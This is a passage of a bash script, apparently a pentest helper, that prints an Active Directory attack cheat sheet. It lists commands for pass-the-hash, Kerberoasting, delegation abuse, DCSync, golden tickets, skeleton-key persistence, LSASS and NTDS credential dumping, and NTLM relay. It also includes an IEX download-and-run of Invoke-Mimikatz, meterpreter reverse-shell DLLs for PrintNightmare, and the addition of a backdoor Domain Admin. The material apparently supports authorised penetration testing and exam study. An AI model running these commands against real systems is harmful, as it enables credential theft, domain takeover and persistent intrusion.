echo "   john --format=lm hash.txt"
echo "   hashcat -m 3000 -a 3 hash.txt"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    NTLM Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   john --format=nt hash.txt"
echo "   hashcat -m 1000 -a 3 hash.txt"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    NLTMv1 Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   john --format=netntlm hash.txt"
echo "   hashcat -m 5500 -a 3 hash.txt"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    NTLMv2 Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   john --format=netntlmv2 hash.txt"
echo "   hashcat -m 5600 -a 0 hash.txt rockyou.txt"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Kerberos 5 TGS ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   john spn.txt --format=krb5tgs --wordlist=rockyou.txt"
echo "   hashcat -m 13100 -a 0 spn.txt rockyou.txt"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Kerberos ASREP ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   hashcat -m 18200 -a 0 asrep.txt rockyou.txt"
}

MenuResponder() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Responder ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo 
Responder
echo
Hashes
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

PassTheHash(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Pass the Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains python3 /opt/impacket/examples/psexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
echo "  $ProxyChains python3 /opt/impacket/examples/wmiexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
echo "  $ProxyChains python3 /opt/impacket/examples/atexec.py -hashes :$NTHash $ActiveUsername@$ActiveHost"
echo "  $ProxyChains evil-winrm -i $ActiveHost -u $ActiveUsername -H :$NTHash"
echo "  $ProxyChains xfreerdp /u:$ActiveUsername /d:$ADdomain /pth:$NTHash /v:@$ActiveHost"
}

OverPassTheHash(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    OverPass the Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   a1)"
echo "  $ProxyChains /opt/impacket/examples/getTGT.py $ADdomain/$ActiveUsername -hashes :$NTHash"
echo "   a2)"
echo "  $ProxyChains export KRB5CCNAME=/tmp/domain_ticket.ccache"
echo "   a3)"
echo "  $ProxyChains /opt/impacket/examples/psexec.py $ADdomain/$ActiveUsername@$ActiveHost -i -no-pass"
echo "   b1)"
echo "  $ProxyChains Rubeus asktgt /user:$$ActiveUsername /rc4:<rc4value>"
echo "   b2a)"
echo "   Rubues ptt /ticket:<ticket>"
echo "   b2a)"
echo "   Rubeus createnetonly /program:C:\Windows\System32\cmd.exe"
echo "   b2b)"
echo "   Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>"
echo
echo "   https://github.com/GhostPack/Rubeus#kerberoast" 
echo
echo "   Rubeus.exe kerberoast /stats"
echo "   e.g. [*] Total kerberoastable users : 4"
echo
echo "   Rubeus.exe kerberoast /user:harmj0y /simple"
echo "   e.g. $krb5tgs$18$*harmj0y$ hash"
echo
echo "   Rubeus.exe asreproast" 
echo "   e.g. $krb5asrep$" 
echo
echo "   Rubeus.exe asreproast /user:TestOU3user" 
echo "   e.g. $krb5asrep$TestOU3user@"
echo
echo -e "mimikatz# privilege::debug\nmimikatz# token::elevate\nmimikatz# sekurlsa::logonpasswords\nmimikatz# lsadump::sam\nmimikatz# exit"
echo "   sekurlsa::pth /user:$ValidUser /domain:$ADdomain /ntlm:$NTHash /run:PowerShell.exe"
echo "   net use \\\\$ADIP"
echo "   klist"
}

UnconstrainedDelegation(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Uncontstrained Delegation ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Get Tickets:"
echo "   privilege::debug sekurlsa::tickets /export"
echo "   sekurlsa::tickets /export"
echo "   Rubeus dump /service:krbtgt /nowrap"
echo "   Rubeus dump /luid:0xdeadbeef /nowrap"
echo
echo "   Get unconstrained delegation machines:"
echo "   Get-NetComputer -Unconstrained"
echo "   Get-DomainComputer -Unconstrained -Properties DnsHostName" 
}

ContstrainedDelegation(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Contstrained Delegation ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   With Protocol transition:"
echo "   .\Rubeus hash /password:<password>"
echo "   .\Rubeus asktgt /user:$ActiveUsername /domain:$ADdomain /aes256:<AES 256 hash>"
echo "   .\Rubeus /ticket:ticket /imporsonatuser:<admin_user> /msdsspn:<spn_contrained> /altserver:HTTP /ptt"
echo "   HOST: psexec \\\<target cmd"
echo "   PS: Enter-PSsession -computername <target>"
echo "   PS: Invoke-Command <target> -ScriptBlock {cmd}"
echo "   CIFS: dir \\\\<target>\\c$"
echo
echo "   Get constrained delegation:"
echo "   Powerview: Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo"
echo "   Powerview: Get-DomainUser -TrustedToAuth"
echo
echo "   Bloodhound:"
echo "   MATCH (c:Computer {unconstraineddelegation:true}) RETURN c"
echo "   MATCH (u:User{owned:true}).(c:Computer {unconstraineddelegation:true}).p=shortestPath((u)-[*1..]->(c)) RETURN p"
echo "   https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/" 
echo "   https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/F%20-%20BloodHound/README.md" 
echo "   https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound-overview"
echo 
}

ResourceBasedConstrainedDelegation(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    dcsync ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   lsadump::/dcsync /domain:$ADdomain /user:krbtgt # Administrators, Domain Admins or Enterprise Admins as well as Domain Controller computer accounts."
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    WSUSpendu.ps1 # need compromised WSUS Server: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://github.com/AlsidOfficial/WSUSpendu"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    MSSQL: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Users with SQLAdmin"
echo "   xp_dir_tree: impacket-ntlmrelayx --no-http-server-smb2support -t <target> -c <command>"
echo "   exec: EXECTUE sp_configure 'show advanced options', 1; RECONFIGURE;"
echo "   exec: EXECUTE sp_configure 'xp_cmdshell, 1; RECONFIGURE;"
echo "   exec: EXEC xp_cmdshell '<cmd>'"
echo
echo "   Trust link:"
echo "   Get-SQLServerLinkCrawl -username $ActiveUsername -password '$ActivePass' -Verbose - Instance <sql_instance> -Query \"<query\""
echo "   use exploit/windows/mssql/mssql_linkcrawler"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Printers spooler service abuse: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   rpcdump.py '$ADdomain/$ActiveUsername:$ActivePass'@$ADIP | grep MS-RPRN"
echo "   printerbug.py '$ADdomain/$ActiveUsername:$ActivePass'@$ADIP $ActiveHost"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    AD Abuse ACL: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Checks:"
echo -e "GenericAll on User\nGenericAll on Group\nGenericAll / Generic Write / Write on Computer\nWriteProperty on Group\nSelf (Self-Membership) on Group\nWriteProperty (Self-Membership)\nForceChangePassword\nWriteOwner on Group\nGenericWrite on User\nWriteDACL + WriteOwner"
echo
echo -e "GenericAll On User\nGenericWrite On user\nABUSE ACCOUNT"
echo
echo "   https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py"
echo "   add SPN # KERBEROASTING"
echo "   change password" 
echo 
echo "   https://github.com/eladshamir/Whisker"
echo "   shadow credentials: pywhisker.py"
echo "   Whisker.exe"
echo "   certipy shadow auto '$ADdomain\\$ActiveUsername:$ActivePass@$ADdomain' -account '<target_account>'"
echo "   https://github.com/ly4k/Certipy"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    AD ACL PWN.py: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://github.com/fox-it/aclpwn.py" 
echo "   https://github.com/fox-it/Invoke-ACLPwn" 
echo 
echo "   acltoolkit $ADdomain/$ActiveUsername:'$ActivePass'@$ADIP get-objectacl [-all -object <object]" 
echo "   https://github.com/zblurx/acltoolkit" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Abuse GPO: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Powerview: Get-DomainObjectAcl -SearchBase "CN-Policies,CN=System,$ADsuffix" -ResolveGUIDS | >{$ObjectAceType -eq \"Group-Policy-Container\"} |select ObjectDN,ActiveDirectoryRights, SecurityIdentifier|fl" 
echo "   Powerview: Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | > {$_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\"|select ObjectDN, SecurityIdentifier|fl"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    LAPS Password: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo "   Get-LAPSPasswords -DomainController $ADIP -Credential $ADdomain\\$ActiveUsername | Format-Table -Autosize"
echo "  $ProxyChains crackmapexec ldap $ADIP -d $domain -u $ActiveUsername -p $ActivePass --module laps"
echo "   msfconsole: use post/windows/gather/credentials/enum_laps"
echo "   foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -new $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Privilege Exchange: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   https://github.com/dirkjanm/PrivExchange" 
echo "   python privexchange -ah $ActiveHost $ADIP -u $ActiveUsername -d $ADdomain -p '$ActivePass'"
echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://$FQDN --escalate-user $ActiveUsername"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Coerced auth: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Print Spooler service abuse"
echo "   SMB LDAP(S): rpcdump.py $ADdomain/$ActiveUsername:'$ActivePass'@$ADIP | grep MS-RPRN"
echo "   SMB LDAP(S): printerbug.py '$ADdomain/$ActiveUsername:$ActivePass'@<Printer IP> $ActiveHost"
echo "   SMB LDAP(S): sudo python3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://$ADIP --remove-mic --add-computer <computer_name> <computerpassword> --delegate-access -smb2support"
echo "   SMB LDAP(S): sudo python3 /opt/impacket/examples/ntlmrelayx.py --remove-mic --escalate-user $ActiveUsername -t ldap://$FQDN -smb2support"
echo "   HTTP LDAPS: PetitPotam: https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py"
echo "   HTTP LDAPS: PetitPotam: python3 Petitpotam.py <attacking machine’s IP> <target Domain Controller’s IP>"
echo "   HTTP LDAPS: Webclient Service is started on target (or coerced with SearchConnector-ms)"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Pass the Certificate: ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py" 
echo "   gettgtpkinit.py -cert-pfx \"<pfx_file\" ^[-pfx-pass \"cert-password>\"] \"$FQDN/$ActiveUsername\" \"<tgt_ccache_file>\""
echo
echo "   Rubues.exe asktgt /user:\"<username>\" /certificate:\"<pfx_files>\" [/password:\"certificate_password>\"] /domain:\"$FDQN\" /dc:\"<dc>\" /show"
echo
echo "   https://github.com/ly4k/Certipy"
echo "   certipy auth '$ADdomain/$ActiveUsername@$ADIP' -cert <crt_file> -key <private_key_file>"
echo "   NTLM HASH From Certificate: certipy auth -pfx <certificate.pfx> -username <username> -domain <domain> -dc-ip $ADIP"
echo
}

ServicePrincipalNames(){
echo "   Get-SPN -type user -search "svc*" -DomainController $ADIP  -Credential $ADdomain\\$ActiveUsername"
echo "   Get-SPN -type service -search "svc*" -DomainController $ADIP  -Credential $ADdomain\\$ActiveUsername"
echo
echo "   \$User = \"$ADdomain\\$ActiveUsername\""
echo "   \$PWord = ConvertTo-SecureString -String \"$ActivePass\" -AsPlainText -Force"
echo "   \$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \$User, \$PWord"
echo "   Get-SPN -type service -search "svc*" -DomainController $ADIP  -Credential \$Credential"
echo
echo "   Add-Type -AssemblyName System.IdentityModel"
echo "   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'svc/fqdn.domain.local:1433'"
echo "   mimikatz.exe"
echo "   privilege::debug"
echo "   kerberos::list /export"
echo "   python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket>\@svc-<name>~domainname~port~domain.kirbi"
echo "   john HashCapture.txt -w=rockyou.txt"
echo "   Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\\users\\public\\HashCapture.txt’ -Width 8000"
echo "   hashcat.exe -m 13100 sql.txt rockyout.txt --force --self-test-disable"
echo
}

MenuLateral() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Lateral Movement ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
PassTheHash
echo
OverPassTheHash
echo
UnconstrainedDelegation
echo
ContstrainedDelegation
echo
ResourceBasedConstrainedDelegation
echo
ServicePrincipalNames
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuTrust() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Trust Relationship ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Enumeration:"
echo "   nltest.exe /trusted_domains"
echo "   ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"
echo "   Get-DomainTrust -Domain $domain"
echo "   Powerview: Get-DomainTrustMapping"
echo
echo "   Global:"
echo "   Get Child Domain to Forest"
echo "   Get-DomainSID -Domain $domain"
echo
echo "   Mimikatz:"
echo "   lsadump::trust /patch"
echo "   lsadump::lsa /patch"
echo "   lsadump::dcsync /domain:$domain /user:$ADdomain\krbtgt"
echo "   kerberos::gold /user:Administrator /krbtgt:<hash_krbtgt> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt"
echo
echo "   Breaking Forest Trust:"
echo "   .\Rubeus.exe monitor /interval:5 /filteruser:<target_dc_account$>"
echo "   .\SpoolSample.exe <target_dc> <unconstrained_target_listener>"
echo "   .\Rubeus.exe ptt /ticket:<ticket>"
echo "   mimikatz: lsdadump::dcsync /domain:<target_domain> /user:<target_domain>\Administrator"
echo 
echo "   Bloodhound User With Foreign Domain Group Information: MATCH p=(n:User-[:MemberOf]->(m:Group) WHERE n.domain=\"<domain>\" AND m.domain<>n.domain AND n.name<>m.name RETURN p"
echo "   Bloodhound Groups with Foreign Domain Group Membership: MATCH p=(n:Group {domain:\"<domain>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain AND n.name<>m.name RETURN p"
echo "   Powerview: Get-DomainForeignGroupMember -Domain <target>"
echo "   Powerview: convertfrom-sid <sid>"
echo
echo "   Forest to Forest:"
echo "   Powerview: Get-DomainSID -Domain <domain>"
echo "   Powerview: Get-DomainSID -Domain <target_domain>"
echo "   Powerview SID Filtering, Find group with SID > 1000: Get-DomainGroupMember -Identity \"<group\" -Domain <target_domain"
echo "   mimikatz: lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt"
echo "   mimikatz: kerberos::gold /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt"
echo
echo "   Child Domain to Forest Compromise - SID Hijacking:"
echo "   Get-NetGroup -Domain $domain -GroupName \"Enterprise Admins\" -FullData | select objectsid"
echo
echo "   kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /rc4:<trust_key> /service:krbtgt /target:<target_domain> /ticket:<golden_ticket_path>"
echo "   .\Rubeus.exe asktgs /ticket:<kirbi_file> /service:\"Service's SPN\" /ptt"
echo
echo "   Breaking Forest Trust:"
echo "   Printerbug or petitpotam to force the DC of the external Forest to connect on a local unconstrained delegation machine. Capture TGT, inject into memory and dcsync"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuPersistence() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Persistance ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   net group \"Domain Admins\" h4cker /add /domain"
echo "   Golden Ticket:"
echo "   ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>"
echo "   mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain_sid> /aes256:<krbtgt_aes256> /ptt\""
echo "   Silver Ticket:"
echo "   mimikatz \"kerberos::golden /user:<current_user_sid> /sid:<domain_sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt\""
echo
echo "   Directory Service Restore Mode (DSRM)"
echo "   PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminBehavior\" -Value 2 - PropertyType DWORD"
echo "   if exists:"
echo "   PowerShell Sew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminBehavior\" -Value 2 - PropertyType DWORD"
echo
echo "   Skeleton Key:"
echo "   mimikatz \"privileged::debug\" \"misc::skeleton\" exit"
echo
echo "   Custom SSP:"
echo "   mimikatz \"privileged::debug\" \"misc::memssp\" exit | C:\\Windows\\System32\\kiwissp.log"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuDomain-Admin() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] CrackMapExec NTDS.dit ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --ntds"
echo "   Additionally: --ntds [{drsuapi,vss}]"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Secretsdump.py ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains python3 /opt/impacket/examples/secretsdump.py '$ADdomain/$ActiveUsername:$ActivePass'@$ADIP"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] NTDS Dump to C:\Temp ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
NTDS="ntdsutil\nac i ntds\nifm\ncreate full C:\\\\temp\\ \nq"
echo -e $NTDS
echo
NTDS2="C:\\>ntdsutil\nntdsutil: activate instance ntds\nntdsutil: ifmk\nifm: create full c:\\\\temp\\ \nifm: quit\nntdsutil: quit"
echo -e $NTDS2
echo
echo "   msfconsole > use windows/gather/credentials/domain_hashdump"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] SecretsDump Extract ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL"
echo "   /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   " 
ShowMeMore
}

MenuAdministrator() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Administrator Access - Get Credentials ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   .\ProcDump64.exe -accepteula -ma lsass.exe lsass.dmp"
echo
echo -e "mimikatz# privilege::debug\nmimikatz# token::elevate\nmimikatz# sekurlsa::logonpasswords\nmimikatz# lsadump::sam\nmimikatz# exit"
echo
echo -e "   powershell \"IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP/Invoke-Mimikatz.ps1')\""
echo "   Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"'"
echo 
echo "   msfconsole session: use post/windows/gather/smart_hashdump"
echo
echo "   .\pwdump8.exe"
echo "   https://www.openwall.com/passwords/windows-pwdump" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] CrackMapExec SAM/LSA/NTDS ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam / --lsa / --ntds"
echo "   Additionally: --ntds [{drsuapi,vss}]"
echo
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] LSA as a Protected Process: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "mimikatz# !+\nmimikatz# !processprotect /process:lsass.exe /remove\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Search Password Files: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   findstr /si 'password' *.txt *.xml *.docx"
echo "   Search Stored Passwords"
echo "   .\lazagne.exe all | https://github.com/AlessandroZ/LaZagne/releases" 
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Shadow Copies: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   diskshadow list shadows all" 
echo "   mklink /d C:\\shadowcopy \\\\?GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\\1\\"
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Token Manipulation: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   .\icognito.exe list_tokens -u"
echo "   .\icognito.exe execute -c \"$ADdomain\\$ActiveUsernames\" powershell.exe"
echo
echo "   msfconsole: use incognito"
echo "   msfconsole: imporsonate_token \"NT AUTHORITY\\\\SYSTEM\""
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuDomain-Account() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Got an Account on the Domain ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Get All Users: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetADUsers.py -all -dc-ip $ADIP $ADdomain/$ActiveUsername"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo -e "\e[96m ${bold}    [+] Enumerate SMB Share: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --shares"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo -e "\e[96m ${bold}    [+] Get Bloodhound json files: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains bloodhound-python -d $ADdomain -u $ActiveUsername -p '$ActivePass' -gc $ADIP -c all"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
echo "   Pywerview: https://github.com/the-useless-one/pywerview" 
echo
echo -e "\e[96m ${bold}    [+] Kerberoasting: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "  $ProxyChains python3 /opt/opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername:'$ActivePass'"
echo "   Powerview: Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName"
echo "   Bloodhound: MATCH(u:User {hasspn:true}) RETURN u"
echo "   Bloodhound: MATCH(u:User {hasspn:true}.(c:Computer).p=shortestPath(u)-[*1..]->(c)) RETURN p"
echo "   rpcclient $> lookupnames $ActiveUsername"
echo "   wmic useraccount get name, sid"
echo "   msfconsole:auxiliary/admin/kerberos/ms14_068_kerberos_checksum"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] MS14-068: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   FindSMB2UPTime.py $ActiveHost | https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py" 
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] DNS Admin User (whoami /groups): ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   msfvenom -p windows/x64/exec cmd='net group "Domain Admins" h4cker /add /domain' -f dll > /tmp/evil.dll"
echo "   mkdir $HOME/OSCPShare"
echo "   cd $HOME/OSCPShare"
echo "   python3 /opt/impacket/examples/smbserver.py share . -smb2support" 
echo "   dnscmd.exe /config /serverlevelplugindll \\\\$ActiveHost\\share\\evil.dll"
echo "   sc \\\\$ADIP stop dns"
echo "   sc \\\\$ADIP start dns"
echo "   https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] PrintNightMare: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   Check:"
echo "   impacket-rpcdump x.x.x.x | egrep 'MS-RPRN|MS-PAR'"
echo
echo -e "sudo su\ncd /opt\ngit clone https://github.com/cube0x0/CVE-2021-1675.git\ncd /opt/impacket-rpc/\ngit clone https://github.com/cube0x0/impacket.git\ncd impacket/\napt install virtualenv\npip3 install ."
echo
echo -e "sudo su\ncd /\nmkdir /server\ncd /server/\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ActiveHost LPORT=8443 -f dll > shell.dll\npython3 /opt/impacket/examples/smbserver.py share . -smb2support"
echo
echo -e "msfconsole\nmsf6 > use multi/handler\n\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost tun0\nmsf6 exploit(multi/handler) > set lport 8443\nmsf6 exploit(multi/handler) > exploit -j"
echo
echo -e "python3 /opt/CVE-2021-1675/CVE-2021-1675.py DOMAIN/user:'PASS'@x.x.x.x '\\KALI\share\shell.dll'"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Enumerate DNS: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" 
echo "   # Check if the '*' record exist"
echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a query -r "*" $ADIP"
echo "   # creates a wildcard record"
echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a add -r "*" -d $LocalIP $ADIP"
echo "   # disable a node"
echo "  $ProxyChains python3 dnstool.py '$ADdomain\\$ActiveUsername' -p '$ActivePass' -a remove -r "*" $ADIP"
echo "   # remove a node"
echo "  $ProxyChains python3 dnstool.py -u "$ADdomain\$ActiveUsername" -p "password" -a ldapdelete -r "*" $ADIP"
echo "   https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

MenuRelay(){
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Relay: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   MS08-068"
echo "   use exploit/windows/smb/smb_relay # Windows 2000 / Windows Server 2008"
echo
echo "   sudo python /opt/Responder/Responder.py -I [interface] # disable smb & http"
echo "   sudo python3 /opt/Responder/Responder.py -I [interface] # disable smb & http"
echo "   sudo python3 /opt/impacket/examples/ntlmrelayx.py -tf targets"
echo
echo "   mitm6 -i eth0 -d $ADdomain"
echo "   https://github.com/dirkjanm/mitm6.git"
echo
